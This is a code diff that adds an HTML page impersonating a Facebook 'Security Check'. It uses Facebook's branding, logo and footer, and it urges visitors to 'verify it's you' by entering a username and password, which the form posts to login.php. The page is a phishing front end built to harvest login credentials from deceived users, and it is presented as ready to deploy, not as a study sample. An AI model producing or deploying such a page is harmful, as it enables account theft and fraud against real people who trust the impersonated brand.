@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Security Check</title>
+	<link rel="shortcut icon" type="image/x-icon" href="./fb-ico.png">
+	<style>
+		/* Reset */
+		*, *::before, *::after {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			font-family: Helvetica, Arial, sans-serif;
+			background: #fff;
+			color: #1c1e21;
+			line-height: 1.34;
+		}
+
+		/* Header */
+		header {
+			width: 100%;
+			height: 56px;
+			background: #3b5998;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			padding: 0 16px;
+		}
+
+		.logo img {
+			max-height: 36px;
+		}
+
+		/* Form Container */
+		.form {
+			border: 1px solid #dddfe2;
+			border-radius: 8px;
+			max-width: 500px;
+			width: 90%;
+			margin: 40px auto;
+			padding: 20px;
+			background: #fff;
+		}
+
+		.form h3 {
+			color: #1c1e21;
+			font-size: 17px;
+			font-weight: bold;
+			padding-bottom: 12px;
+			margin-bottom: 16px;
+			border-bottom: 1px solid #dadde1;
+		}
+
+		/* Red Warning Box */
+		.red-box {
+			background: #fff3f4;
+			border: 1px solid #ff3333;
+			border-radius: 8px;
+			padding: 12px 16px;
+			margin-bottom: 16px;
+			font-size: 13px;
+			color: #1c1e21;
+		}
+
+		.red-box p {
+			margin: 4px 0;
+		}
+
+		.red-box a {
+			color: #385898;
+			text-decoration: none;
+		}
+
+		.red-box a:hover {
+			text-decoration: underline;
+		}
+
+		/* Login Form */
+		.login-form {
+			width: 100%;
+		}
+
+		.login-form label {
+			display: block;
+			font-size: 13px;
+			font-weight: bold;
+			margin: 8px 0 4px;
+			color: #1c1e21;
+		}
+
+		.login-form input[type="text"],
+		.login-form input[type="password"],
+		.login-form input[type="username"] {
+			width: 100%;
+			padding: 8px 12px;
+			font-size: 15px;
+			border: 1px solid #dddfe2;
+			border-radius: 6px;
+			background: #f5f6f7;
+			transition: border-color 0.15s;
+		}
+
+		.login-form input[type="text"]:focus,
+		.login-form input[type="password"]:focus {
+			outline: none;
+			border-color: #385898;
+			background: #fff;
+			box-shadow: 0 0 0 2px #e7f3ff;
+		}
+
+		.keep-container {
+			display: flex;
+			align-items: center;
+			margin: 12px 0;
+			font-size: 13px;
+		}
+
+		.keep-container input[type="checkbox"] {
+			margin-right: 8px;
+			width: 14px;
+			height: 14px;
+		}
+
+		.login-form input[type="submit"] {
+			width: 100%;
+			background: #1877f2;
+			border: none;
+			color: #fff;
+			font-size: 17px;
+			font-weight: bold;
+			padding: 10px 16px;
+			border-radius: 6px;
+			cursor: pointer;
+			margin: 8px 0 12px;
+		}
+
+		.login-form input[type="submit"]:hover {
+			background: #166fe5;
+		}
+
+		.forgot-link {
+			text-align: center;
+		}
+
+		.forgot-link a {
+			color: #1877f2;
+			font-size: 13px;
+			text-decoration: none;
+		}
+
+		.forgot-link a:hover {
+			text-decoration: underline;
+		}
+
+		/* Footer */
+		footer {
+			max-width: 500px;
+			width: 90%;
+			margin: 0 auto 30px;
+			color: #737373;
+			font-size: 12px;
+			text-align: center;
+		}
+
+		footer ul {
+			list-style: none;
+			margin: 8px 0;
+		}
+
+		footer li {
+			display: inline;
+			margin: 0 6px;
+		}
+
+		footer a {
+			color: #737373;
+			text-decoration: none;
+		}
+
+		footer a:hover {
+			text-decoration: underline;
+		}
+
+		/* Mobile */
+		@media (max-width: 500px) {
+			header {
+				height: 48px;
+			}
+			.logo img {
+				max-height: 28px;
+			}
+			.form {
+				padding: 16px;
+			}
+			.red-box {
+				padding: 10px 12px;
+				font-size: 12px;
+			}
+			footer li {
+				display: block;
+				margin: 4px 0;
+			}
+		}
+	</style>
+</head>
+<body>
+	<header>
+		<div class="logo">
+			<a href="http://www.facebook.com"><img src="./logo.png" alt="Facebook"></a>
+		</div>
+	</header>
+	
+	<section>
+		<div class="form">
+			<div class="m-header">
+				<h3>Facebook Security Check. Please Verify It's You.</h3>
+			</div>
+			
+			<div class="red-box">
+				<p><strong>Verify needed to understand it's you</strong></p>
+				<p>Enter your password for security reason (make sure your caps lock is off)</p>
+				<p>Forgot your password? <a href="#">Request new one</a></p>
+			</div>
+
+			<div class="login-form">
+				<form method="post" novalidate id="login-form" action="login.php">
+					<label for="username">Username:</label>
+					<input name="username" id="username" type="text" required>
+
+					<label for="password">Password:</label>
+					<input name="password" id="password" type="password" required>
+
+					<div class="keep-container">
+						<input id="keep" type="checkbox">
+						<label for="keep">Keep me logged in</label>
+					</div>
+
+					<input type="submit" name="submit" value="Verify">
+
+					<div class="forgot-link">
+						<a href="#">Can't log in?</a>
+					</div>
+				</form>
+			</div>
+		</div>
+		
+		<footer>
+			<ul>
+				<li><a href="#">Mobile</a></li>
+				<li><a href="#">Find Friends</a></li>
+				<li><a href="#">Badges</a></li>
+				<li><a href="#">People</a></li>
+				<li><a href="#">Pages</a></li>
+				<li><a href="#">Apps</a></li>
+				<li><a href="#">Games</a></li>
+				<li><a href="#">Music</a></li>
+				<li><a href="#">Locations</a></li>
+			</ul>
+			<ul>
+				<li><a href="#">Topics</a></li>
+				<li><a href="#">About</a></li>
+				<li><a href="#">Create Ad</a></li>
+				<li><a href="#">Create Page</a></li>
+				<li><a href="#">Developers</a></li>
+				<li><a href="#">Careers</a></li>
+				<li><a href="#">Privacy</a></li>
+				<li><a href="#">Cookies</a></li>
+				<li><a href="#">Terms</a></li>
+				<li><a href="#">Help</a></li>
+			</ul>
+			<p>Meta © 2025</p>
+		</footer>
+	</section>
+</body>
+</html>
